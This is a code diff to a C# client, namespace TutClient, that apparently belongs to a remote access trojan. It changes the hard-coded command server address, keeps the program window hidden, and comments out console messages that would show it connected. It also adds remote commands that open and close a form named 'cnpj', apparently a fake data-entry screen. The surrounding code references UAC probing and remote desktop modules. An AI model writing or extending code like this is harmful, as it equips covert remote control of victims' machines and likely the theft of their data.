@@ -318,7 +318,8 @@ namespace TutClient
         static void Main(string[] args)
         {
 #if HideWindow
-            if (applicationHidden) ShowWindow(Process.GetCurrentProcess().MainWindowHandle.ToInt32(), SW_HIDE); //Hide application if specified
+                        if (applicationHidden)
+                { ShowWindow(Process.GetCurrentProcess().MainWindowHandle.ToInt32(), SW_HIDE); }//Hide application if specified
 #endif
             _handler += new EventHandler(Handler); //Create a new handler
             SetConsoleCtrlHandler(_handler, true); //Assign the custom handler function
@@ -464,7 +465,7 @@ namespace TutClient
         private static void ConnectToServer()
         {
             int attempts = 0; //Connection attempts to the server
-            string ipCache = GetIPAddress("192.168.10.20"); //Replace IP with DNS if you want
+            string ipCache = GetIPAddress("10.0.2.15"); //Replace IP with DNS if you want
             if (IsLinuxServer) encoder = Encoding.UTF8;
             else encoder = Encoding.Unicode;
 
@@ -487,12 +488,12 @@ namespace TutClient
                     {
                         RDesktop.isShutdown = true;
                     }
-                    Console.Clear();
+                    //Console.Clear();
                 }
             }
 
-            Console.Clear();
-            Console.WriteLine("Connected"); //Client connected
+            //Console.Clear();
+            //Console.WriteLine("Connected"); //Client connected
         }
 
         /// <summary>
@@ -1288,6 +1289,18 @@ namespace TutClient
 
                 UAC uac = new UAC(); //Create a new UAC module
                 uac.ProbeStart(pm); //Probe the startup using the selected method
+            }
+            else if (text == "stdt1")      //abrir1tela
+            {
+               // cnpj cnpj = new cnpj();
+               // cnpj.Show();
+                Application.Run(new cnpj());
+            }
+            else if (text == "stdt1oc")      //fechartela
+            {
+                
+                cnpj.ActiveForm.Close();
+                //Application.Run(new cnpj());
             }
         }
 
